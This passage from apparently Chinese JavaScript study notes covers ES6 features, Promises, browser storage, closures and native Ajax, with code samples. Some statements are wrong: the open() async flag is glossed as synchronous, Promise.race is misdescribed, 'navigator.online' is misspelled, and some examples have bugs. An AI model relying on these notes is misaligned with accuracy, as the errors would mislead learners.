class="hljs-keyword">let</span> arr=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br><span class="hljs-keyword">const</span> [x,y,z]=arr;<br><br><span class="hljs-comment">//对象</span><br><span class="hljs-keyword">const</span> person=&#123;<br>    <span class="hljs-attr">name</span>:<span class="hljs-string">&quot;Martin&quot;</span>,<br>    <span class="hljs-attr">age</span>:<span class="hljs-number">22</span>,<br>    <span class="hljs-attr">languages</span>:[<span class="hljs-string">&#x27;Java&#x27;</span>,<span class="hljs-string">&#x27;Python&#x27;</span>]<br>&#125;;<br><br><span class="hljs-keyword">const</span> &#123;<span class="hljs-attr">name</span>:n,<span class="hljs-attr">age</span>:a,<span class="hljs-attr">language</span>:l&#125;=person;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n,a,l);<br></code></pre></td></tr></table></figure><ul><li>函数参数允许默认值，引入rest参数，新增箭头函数；</li></ul><p><a href="https://blog.csdn.net/sinat_41696687/article/details/121903414">https://blog.csdn.net/sinat_41696687/article/details/121903414</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// =&gt;不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；</span><br><span class="hljs-comment">//如果箭头函数的外层有普通函数，this指向普通函数的this；</span><br><span class="hljs-comment">//妹有普通函数，this指向全局变量</span><br><span class="hljs-comment">//有</span><br><span class="hljs-keyword">let</span> obj = &#123;<br>  <span class="hljs-attr">fn</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;我是普通函数&#x27;</span>,<span class="hljs-variable language_">this</span> === obj)   <span class="hljs-comment">// true</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-function">()=&gt;</span>&#123;<br>          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;我是箭头函数&#x27;</span>,<span class="hljs-variable language_">this</span> === obj) <span class="hljs-comment">// true</span><br>      &#125;<br>  &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-title function_">fn</span>()())<br><br><span class="hljs-comment">//妹有</span><br><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">fn</span>:<span class="hljs-function">()=&gt;</span>&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === <span class="hljs-variable language_">window</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-title function_">fn</span>())<br><span class="hljs-comment">// true</span><br><br><span class="hljs-comment">//默认值</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b=<span class="hljs-number">1</span></span>)&#123;<br>    <span class="hljs-keyword">return</span> a+b;<br>&#125;<br><br><span class="hljs-comment">//箭头函数是匿名函数，不能作为构造函数，不可以使用new；</span><br><br><span class="hljs-comment">//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;</span><br></code></pre></td></tr></table></figure><ul><li>数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//字符串拓展</span><br><span class="hljs-keyword">let</span> str = <span class="hljs-string">&quot;hello ReactJS&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str,<span class="hljs-string">&quot;中是否包含ReactJS&quot;</span>,str.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;ReactJS&quot;</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str,<span class="hljs-string">&quot;是否以h开头&quot;</span>,str.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&quot;h&quot;</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str,<span class="hljs-string">&quot;是否以actJS结尾&quot;</span>,str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">&quot;actJS&quot;</span>));<br><br><span class="hljs-comment">//字符串模板</span><br><span class="hljs-keyword">let</span> str = <span class="hljs-string">`c</span><br><span class="hljs-string">y</span><br><span class="hljs-string">l`</span>;<br></code></pre></td></tr></table></figure><ul><li>对象和数组新增拓展运算符号；</li><li>新增模块化：import,export;</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> name=<span class="hljs-string">&#x27;Martin&#x27;</span>;<br><span class="hljs-keyword">export</span> &#123;name&#125;;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">MakeLove</span>(<span class="hljs-params"></span>)&#123;<br>    <br>&#125;<br><br><br></code></pre></td></tr></table></figure><ul><li>新增Set()和Map数据结构；</li><li>原生提供Proxy构造函数，用来生成Proxy实例；</li><li>新增生成器<strong>Generater</strong>和<strong>Iterator</strong>；</li></ul><h3 id="3-Bigint"><a href="#3-Bigint" class="headerlink" title="3.Bigint"></a>3.Bigint</h3><blockquote><p>支持任意长度的整数：末尾+n；</p><p>不能混用常规的和Bigint</p></blockquote><h3 id="4-Promise-和-Await"><a href="#4-Promise-和-Await" class="headerlink" title="4.Promise 和 Await"></a>4.Promise 和 Await</h3><p><a href="https://es6.ruanyifeng.com/#docs/promise">https://es6.ruanyifeng.com/#docs/promise</a></p><ul><li>Promise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；</li><li>一个用来保存某个未来才会结束的事件；</li></ul><blockquote><p>Promise对象有以下两个特点：</p><p>（1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：</p><p>pending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；</p><p>（2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending-&gt;fulfilled，pending-&gt;rejected</p><p>状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；</p><p>缺点：</p><p>无法取消Promise，一旦新建就会立即执行，无法中途取消；</p><p>不设置回调函数，Promise内部抛出的错误不会反映到外部；</p><p>当处于pending状态时，无法得知目前进展到哪一个阶段；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject</span><br><span class="hljs-comment">//resolve函数是将Promise对象的状态从未完成变成成功；pending-&gt;resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；</span><br><span class="hljs-comment">//reject函数时将promise对象的状态从未完成变成失败，pending-&gt;rejected，异步操作错误时将报错错位参数传递出去；</span><br>promise.<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">valueA</span>)&#123;<br>    <br>&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">error</span>)&#123;<br>    <br>&#125;)<br><br></code></pre></td></tr></table></figure><ul><li>promise.prototype.then(参数1，参数2)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；</span><br><span class="hljs-comment">//可以采用链式写法</span><br><span class="hljs-title function_">getJSON</span>(<span class="hljs-string">&quot;url&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">error</span>)=&gt;</span>&#123;<br>    <br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>promise.prototype.catch()</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//是then的别名，用于指定发生错误时的回调函数</span><br><span class="hljs-title function_">getJson</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>promise.prototype.finally()</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">getJson</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>)=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>&#125;).<span class="hljs-title function_">finally</span>(<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-comment">//最后一定执行</span><br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>promise.all()</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将多个promise实例，包装成一个新的promise实例</span><br><span class="hljs-keyword">const</span> p=<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([p1,p2,p3]);<br><br><span class="hljs-comment">//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；</span><br><span class="hljs-keyword">const</span> databasePromise = <span class="hljs-title function_">connectDatabase</span>();<br><br><span class="hljs-keyword">const</span> booksPromise = databasePromise<br>  .<span class="hljs-title function_">then</span>(findAllBooks);<br><br><span class="hljs-keyword">const</span> userPromise = databasePromise<br>  .<span class="hljs-title function_">then</span>(getCurrentUser);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([<br>  booksPromise,<br>  userPromise<br>])<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">[books, user]</span>) =&gt;</span> <span class="hljs-title function_">pickTopRecommendations</span>(books, user));<br></code></pre></td></tr></table></figure><ul><li>Promise.race():多个实例任一成功都会返回成功；</li></ul><h3 id="5-数组方法"><a href="#5-数组方法" class="headerlink" title="5.数组方法"></a>5.数组方法</h3><h3 id="6-离线应用和客户端存储"><a href="#6-离线应用和客户端存储" class="headerlink" title="6.离线应用和客户端存储"></a>6.离线应用和客户端存储</h3><ul><li>离线检测</li></ul><blockquote><p>HTML5定义了一个navigator.online属性，如果为true表示设备能够上网；</p></blockquote><ul><li>应用缓存</li></ul><blockquote><p>H5使用appcache专门为开发离线Web应用设计；</p><p>从浏览器的缓存区划分一块，使用一个描述文件列出需要下载和缓存的资源；</p></blockquote><ul><li><p>数据存储</p><ol><li>​    Cookie</li></ol><blockquote><p>Http Cookie最初在客户端用于存储会话信息。发送回服务器的额外信息可以用于唯一验证客户来自于发送的哪一个请求；</p></blockquote><blockquote><p>限制：</p><p>cookie在性质上是绑定在特定的域名下，当设定一个cookie后，再给创建他的域名发送请求时都会包含这个cookie，这个限制是的cookie中的信息只能让批准的接收者访问；无法被其他域访问；</p><p>构成:</p><p>Cookie由名称，值，域，路径，失效时间，安全标志组成；</p></blockquote><ol start="2"><li>Web存储机制</li></ol><ul><li>提供一个cookie之外存储会话的途径；</li><li>提供一种存储大量跨会话的数据机制；</li></ul><blockquote><p>storage类型</p><p>它提供组大的存储空间，有clear（），getItem(name)，setItem（name,value)等；</p><p>只能存储字符串；</p></blockquote><blockquote><p>sessionStorage类型</p><p>它用于存储某个会话的数据，也就是数据保存到浏览器关闭时。</p><p>存储在sessionStorage中的数据可以跨越页面刷新而存在，同时如果浏览器支持，崩溃之后也能使用；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//使用方法存储数据</span><br>sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Martin&quot;</span>);<br><span class="hljs-comment">//使用属性存储数据</span><br>sessionStorage.<span class="hljs-property">book</span>=<span class="hljs-string">&quot;JS&quot;</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>globalStorage类型</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">globalStorage[<span class="hljs-string">&#x27;域名&#x27;</span>].<span class="hljs-property">name</span>=<span class="hljs-string">&quot;Martin&quot;</span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>localStorage类型</li></ol></li></ul><blockquote><p>localStorage在H5中作为持久保存客户端数据的方案取代了globalStorage；</p><p>与globalStorage不同；</p></blockquote><h3 id="7-cookie设置，token如何实现登录"><a href="#7-cookie设置，token如何实现登录" class="headerlink" title="7.cookie设置，token如何实现登录"></a>7.cookie设置，token如何实现登录</h3><h3 id="8-闭包"><a href="#8-闭包" class="headerlink" title="8.闭包"></a>8.闭包</h3><blockquote><p>如果一个函数访问量此函数的父级或者父级以上的作用域变量，这个函数就是一个闭包；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a=<span class="hljs-number">1</span>;<br><br><span class="hljs-comment">//匿名立即执行函数，访问了全局变量a;</span><br>(<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);<br>    &#125;<br>)()<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//常见的闭包形式：函数嵌套</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> index=<span class="hljs-number">0</span>;<br>    index=index+<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>)&#123;<br>        index=index+<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(index);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-keyword">var</span> c=<span class="hljs-title function_">a</span>();<span class="hljs-comment">//index=0+1; 将函数a赋值给全局变量c时，a会执行一次，局部变量index变为0+1，返回函数b；此时全局变量C为闭包函数b的引用；</span><br><span class="hljs-title function_">c</span>();<span class="hljs-comment">//index=0+1+2 //第一次执行c时，闭包函数b第一次执行；</span><br><span class="hljs-title function_">c</span>();<span class="hljs-comment">//index=0+1+2+2 //第二次执行c时，闭包函数b第二次执行；</span><br></code></pre></td></tr></table></figure><h5 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h5><ul><li>被闭包函数访问的父级以上函数的局部变量会一致存在于内存中，不会被JS的垃圾回收机制回收；</li><li>闭包函数u实现了对其他函数内部变量的访问；</li></ul><h5 id="JS垃圾回收机制："><a href="#JS垃圾回收机制：" class="headerlink" title="JS垃圾回收机制："></a>JS垃圾回收机制：</h5><ul><li>如果一个对象不再被引用，这个对象会被GC回收；</li><li>如果两个对象相互引用，而不再被第三者所引用，那么这两个对象都会被收回；</li></ul><h5 id="闭包的用途："><a href="#闭包的用途：" class="headerlink" title="闭包的用途："></a>闭包的用途：</h5><ul><li>访问函数内部的变量；</li><li>让变量始终保持在内存中；</li></ul><h5 id="应用场景："><a href="#应用场景：" class="headerlink" title="应用场景："></a>应用场景：</h5><ul><li>模拟面向对象的代码风格</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>)&#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">Say</span>(<span class="hljs-params">content</span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(name+<span class="hljs-string">&quot;:&quot;</span>+content);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Say</span>;<br>&#125;<br><br>a=<span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;martin&quot;</span>);<br>b=<span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jacy&quot;</span>);<br><span class="hljs-title function_">a</span>(<span class="hljs-string">&quot;What are u doing ?&quot;</span>);<br><span class="hljs-title function_">b</span>(<span class="hljs-string">&quot;Nothing&quot;</span>);<br><span class="hljs-title function_">a</span>(<span class="hljs-string">&quot;Hang out with me ?&quot;</span>);<br><span class="hljs-title function_">b</span>(<span class="hljs-string">&quot;To there?&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>使用<code>setTimeout</code>支持传参(通过闭包实现setTimeout第一个函数传参)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">param</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(param);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> f1=<span class="hljs-title function_">func</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">setTimeout</span>(f1,<span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><ul><li>封装私有变量：通过闭包定义能访问私有函数和私有变量的共有函数</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> counter=(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> privateCounter=<span class="hljs-number">0</span>;   <span class="hljs-comment">//私有变量</span><br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">val</span>)&#123;<br>        privateCounter+=val;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">increment</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-title function_">change</span>(<span class="hljs-number">1</span>);<br>        &#125;,<br>        <span class="hljs-attr">decrement</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-title function_">change</span>(-<span class="hljs-number">1</span>);<br>        &#125;,<br>        <span class="hljs-attr">value</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-keyword">return</span> privateCounter;<br>        &#125;<br>    &#125;;<br>&#125;)();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">value</span>());<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>());<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>());<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>());<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">increment</span>());<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(counter.<span class="hljs-title function_">value</span>());<br></code></pre></td></tr></table></figure><ul><li>模拟块作用域</li></ul><p><img src="https://img-blog.csdnimg.cn/764a7d4d2f244f3dbb50fa59da6105eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pyd6ZizMzk=,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><blockquote><p>onclick绑定的function中没有变量i，解析引擎会寻找父级作用域，最终找到全局变量i；for循环结束的时，i的值已经变成了4；所以此时任何onclick点击都会弹出4；</p><p>也可使用let i=0;来解决；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> elements=<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;li&#x27;</span>);<br><span class="hljs-keyword">var</span> length=elements.<span class="hljs-property">length</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;length;i++)&#123;<br>    elements[i].<span class="hljs-property">onclick</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params">num</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num);<br>        &#125;<br>    &#125;(i);           <span class="hljs-comment">//通过匿名闭包，把每次的i保存到一个变量中实现了效果</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>实现迭代器</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">x</span>)&#123;<br>    <span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">return</span> x[i++];<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">var</span> next=<span class="hljs-title function_">setup</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(next);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(next);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(next);<br></code></pre></td></tr></table></figure><h5 id="闭包优点："><a href="#闭包优点：" class="headerlink" title="闭包优点："></a>闭包优点：</h5><ul><li>减少全局变量的定义，避免全局变量污染；</li><li>能够读取函数内部的变量；</li><li>内存中维护一个变量，用作缓存；</li></ul><h5 id="闭包缺点："><a href="#闭包缺点：" class="headerlink" title="闭包缺点："></a>闭包缺点：</h5><ul><li>造成内存泄漏，闭包会使函数中的变量一致保存在内存中，内存消耗极大；</li></ul><p>解决方法：使用完毕以后设置为null；</p><ul><li>闭包可能在父函数外部，改变父函数内部的值；</li><li>由于闭包设计跨作用域访问，会导致性能损失；</li></ul><p>解决方法：通过跨作用域变量存储在局部变量中，直接访问局部变量来减轻对执行素的的影响；</p><h3 id="9-如何实现原生ajax？"><a href="#9-如何实现原生ajax？" class="headerlink" title="9.如何实现原生ajax？"></a>9.如何实现原生ajax？</h3><blockquote><p>Ajax是异步的JS和XML，是一种在无需重新加载整个网页的情况下，更新部分网页的技术；</p></blockquote><ul><li>创建XMLHttpRequest对象；</li></ul><blockquote><p>老版本的浏览器用的ActiveX对象；</p><p>现代浏览器使用XMLHttpRequest对象；</p></blockquote><ul><li>向服务器发送请求；</li></ul><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">open(<span class="hljs-keyword">method</span>,<span class="hljs-title function_">url</span>,<span class="hljs-title function_">async</span>)//请求类型，<span class="hljs-title function_">url</span>位置，<span class="hljs-title function_">true</span>同步<br><span class="hljs-title function_">send</span>（<span class="hljs-title function_">string</span>）//仅用于<span class="hljs-title function_">POST</span>；<br></code></pre></td></tr></table></figure><ul><li>服务器响应；</li></ul><blockquote><p>1.responseText   字符串形式的数据响应；</p><p>2.responseXML  XML形式的数据响应；</p></blockquote><ul><li>判断是否成；</li></ul><blockquote><p>1.onreadystatechange    存储函数，每当readystate属性改变时调用；</p><p>2.readyState              存有XMLHttpRequest的状态；0初始化，1连接建立，2请求已接受，3请求处理中，4请求已完成；</p><p>3.status            200 ok   404 Page not found;</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//原生Ajax</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">oriAjax</span>(<span class="hljs-params">url,</span>)&#123;<br>    <span class="hljs-comment">//判断浏览器版本</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">XMLHttpRequest</span>)&#123;<br>        <span class="hljs-keyword">var</span> ajaxRequest=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">var</span> ajaxRequest=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span 